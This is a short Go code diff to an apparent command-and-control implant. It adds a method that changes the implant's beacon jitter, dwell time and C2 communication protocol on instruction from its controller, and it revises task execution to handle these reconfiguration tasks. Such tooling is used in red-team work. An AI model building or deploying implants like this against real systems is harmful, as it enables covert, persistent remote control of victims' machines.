@@ -127,11 +127,47 @@ func (i *Implant) BeaconLoop() error {
 	}
 }
 
+func (i *Implant) UpdateConfig(newJitter float64, newDwell, newC2CommProtocol string) error {
+	if newJitter != 0 {
+		i.Config.Jitter = newJitter
+
+	}
+	if newDwell != "" {
+		i.Config.Dwell = newDwell
+	}
+	if newC2CommProtocol != "" {
+		comm, err := c2communicator.New(newC2CommProtocol)
+		if err != nil {
+			return fmt.Errorf("failed to update comm protocol: %w", err)
+		}
+		i.C2Communicator = comm
+	}
+	return nil
+}
+
 func (i *Implant) ExecuteTasks() {
 	for !i.TaskQueue.IsEmpty() {
-		task := i.TaskQueue.Dequeue()
-		result := task.Execute()
-		result.TaskID = task.GetID()
+		raw := i.TaskQueue.Dequeue()
+
+		// ConfigureImplant tasks are handled specially, their default Do() function is not used
+		var result task.Result
+		if cfgTask, ok := raw.(*task.ConfigureImplant); ok {
+			err := i.UpdateConfig(cfgTask.NewJitter, cfgTask.NewDwell, cfgTask.NewC2CommProtocol)
+			if err != nil {
+				result = task.Result{
+					Content: err.Error(),
+					Success: false,
+				}
+			} else {
+				result = task.Result{
+					Success: true,
+				}
+			}
+		} else {
+			result = raw.Do()
+		}
+
+		result.TaskID = raw.GetID()
 		i.Results = append(i.Results, result)
 	}
 }
